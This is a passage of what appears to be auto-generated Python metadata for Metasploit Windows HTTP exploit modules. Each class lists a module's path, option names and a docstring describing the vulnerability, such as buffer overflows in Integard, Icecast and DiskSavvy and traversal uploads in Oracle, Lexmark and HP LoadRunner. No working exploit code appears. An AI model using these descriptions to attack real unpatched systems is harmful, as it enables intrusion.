			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_TARGETURI = 'TARGETURI'

	class windows_http_integard_password_bof(object):
		"""
		
            This module exploits a stack buffer overflow in Race river's Integard Home/Pro
          internet content filter HTTP Server. Versions prior to 2.0.0.9037 and 2.2.0.9037 are
          vulnerable.

          The administration web page on port 18881 is vulnerable to a remote buffer overflow
          attack. By sending an long character string in the password field, both the structured
          exception handler and the saved extended instruction pointer are over written, allowing
          an attacker to gain control of the application and the underlying operating system
          remotely.

          The administration website service runs with SYSTEM privileges, and automatically
          restarts when it crashes.
      
		"""

		path = 'windows/http/integard_password_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_icecast_header(object):
		"""
		
        This module exploits a buffer overflow in the header parsing of icecast
        versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32
        HTTP headers will cause a write one past the end of a pointer array. On
        win32 this happens to overwrite the saved instruction pointer, and on
        linux (depending on compiler, etc) this seems to generally overwrite
        nothing crucial (read not exploitable).

        This exploit uses ExitThread(), this will leave icecast thinking the
        thread is still in use, and the thread counter won't be decremented.
        This means for each time your payload exits, the counter will be left
        incremented, and eventually the threadpool limit will be maxed. So you
        can multihit, but only till you fill the threadpool.
      
		"""

		path = 'windows/http/icecast_header'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_oracle_event_processing_upload(object):
		"""
		
        This module exploits an arbitrary file upload vulnerability in Oracle Event Processing
        11.1.1.7.0. The FileUploadServlet component, which requires no authentication, can be
        abused to upload a malicious file onto an arbitrary location due to a directory traversal
        flaw, and compromise the server. By default Oracle Event Processing uses a Jetty
        Application Server without JSP support, which limits the attack to WbemExec. The current
        WbemExec technique only requires arbitrary write to the file system, but at the moment the
        module only supports Windows 2003 SP2 or older.
      
		"""

		path = 'windows/http/oracle_event_processing_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_DEPTH = 'DEPTH'

	class windows_http_lexmark_markvision_gfd_upload(object):
		"""
		
        This module exploits a code execution flaw in Lexmark MarkVision Enterprise before version 2.1.
        A directory traversal vulnerability in the GfdFileUploadServlet servlet allows an unauthenticated
        attacker to upload arbitrary files, including arbitrary JSP code. This module has been
        tested successfully on Lexmark MarkVision Enterprise 2.0 with Windows 2003 SP2.
      
		"""

		path = 'windows/http/lexmark_markvision_gfd_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FileDropperDelay = 'FileDropperDelay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_TARGETURI = 'TARGETURI'

	class windows_http_easyftp_list(object):
		"""
		
          This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11
        and earlier. EasyFTP fails to check input size when parsing the 'path' parameter
        supplied to an HTTP GET request, which leads to a stack based buffer overflow.
        EasyFTP allows anonymous access by default; valid credentials are typically
        unnecessary to exploit this vulnerability.

        After version 1.7.0.12, this package was renamed "UplusFtp".

        Due to limited space, as well as difficulties using an egghunter, the use of
        staged, ORD, and/or shell payloads is recommended.
      
		"""

		path = 'windows/http/easyftp_list'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			required_HttpUsername = 'HttpUsername'
			required_HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_coldfusion_fckeditor(object):
		"""
		
          This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload
        and Execute vulnerability.
      
		"""

		path = 'windows/http/coldfusion_fckeditor'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FCKEDITOR_DIR = 'FCKEDITOR_DIR'

	class windows_http_hp_nnm_getnnmdata_hostname(object):
		"""
		
          This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53.
        By sending specially crafted Hostname parameter to the getnnmdata.exe CGI,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/hp_nnm_getnnmdata_hostname'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_manageengine_apps_mngr(object):
		"""
		
            This module logs into the Manage Engine Appplications Manager to upload a
          payload to the file system and a batch script that executes the payload. 
		"""

		path = 'windows/http/manageengine_apps_mngr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			URI = 'URI'
			USER = 'USER'
			PASS = 'PASS'

	class windows_http_hp_loadrunner_copyfiletoserver(object):
		"""
		
        This module exploits a directory traversal vulnerability in version 11.52 of HP
        LoadRunner. The vulnerability exists in the EmulationAdmin web service, specifically
        in the copyFileToServer method, allowing the upload of arbitrary files. This module has
        been tested successfully on HP LoadRunner 11.52 on Windows 2003 SP2.
      
		"""

		path = 'windows/http/hp_loadrunner_copyfiletoserver'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FileDropperDelay = 'FileDropperDelay'
			required_DEPTH = 'DEPTH'
			required_INSTALLPATH = 'INSTALLPATH'

	class windows_http_disksavvy_get_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability
        in the web interface of DiskSavvy Enterprise v9.1.14 and v9.3.14,
        caused by improper bounds checking of the request path in HTTP GET
        requests sent to the built-in web server. This module has been
        tested successfully on Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/http/disksavvy_get_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			DynamicSehRecord = 'DynamicSehRecord'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_efs_fmws_userid_bof(object):
		"""
		
        Easy File Management Web Server v4.0 and v5.3 contains a stack buffer
        overflow condition that is triggered as user-supplied input is not
        properly validated when handling the UserID cookie. This may allow a
        remote attacker to execute arbitrary code.
      
		"""

		path = 'windows/http/efs_fmws_userid_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
